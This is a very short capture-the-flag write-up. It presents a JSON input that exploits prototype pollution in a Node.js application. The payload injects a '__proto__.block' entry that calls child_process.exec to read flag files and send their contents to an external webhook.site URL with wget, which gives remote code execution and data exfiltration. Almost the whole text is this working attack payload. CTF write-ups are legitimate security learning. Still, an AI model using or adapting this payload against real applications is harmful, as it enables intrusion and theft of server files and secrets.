Prototype pollution that I triggered with an input like below and got the flag.


``` { "song.name":"Not Polluting with the boys",
    "__proto__.block" : {"type": "Text", "line": "process.mainModule.require('child_process').exec('var=\"$(cat flag* )\";wget https://webhook.site/40bfd089-474f-4cbf-8000-b2e904ee07e4?rce=$var')" } 
 }```